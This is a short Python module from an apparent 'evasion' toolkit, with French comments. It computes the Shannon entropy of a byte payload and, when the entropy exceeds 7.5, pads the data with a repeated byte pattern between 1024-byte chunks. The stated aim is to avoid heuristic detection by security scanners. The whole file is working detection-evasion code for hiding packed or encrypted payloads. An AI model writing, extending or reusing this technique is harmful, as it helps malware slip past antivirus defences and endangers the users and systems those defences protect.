# modules/evasion/entropy_normalizer.py
import numpy as np

class EntropyNormalizer:
    def __init__(self):
        pass
        
    def normalize_entropy(self, data):
        """Réduit l'entropie pour éviter la détection heuristique"""
        # Calcul de l'entropie actuelle
        entropy = self._calculate_entropy(data)
        
        if entropy > 7.5:  # Entropie suspecte
            # Ajout de données redondantes pour réduire l'entropie
            normalized_data = self._add_redundant_data(data)
            return normalized_data
            
        return data
        
    def _calculate_entropy(self, data):
        """Calcule l'entropie de Shannon"""
        if len(data) == 0:
            return 0
            
        # Comptage des fréquences
        frequencies = {}
        for byte in data:
            frequencies[byte] = frequencies.get(byte, 0) + 1
            
        # Calcul de l'entropie
        entropy = 0.0
        data_len = len(data)
        
        for count in frequencies.values():
            probability = count / data_len
            entropy -= probability * np.log2(probability)
            
        return entropy
        
    def _add_redundant_data(self, data):
        """Ajoute des données redondantes pour réduire l'entropie"""
        # Stratégie simple: insertion de patterns répétitifs
        redundant_pattern = b'\x00\x41\x42\x43' * 64  # Pattern ABC répété
        
        # Insertion du pattern à intervalles réguliers
        result = bytearray()
        chunk_size = 1024
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            result.extend(chunk)
            if i + chunk_size < len(data):  # Pas à la fin
                result.extend(redundant_pattern)
                
        return bytes(result)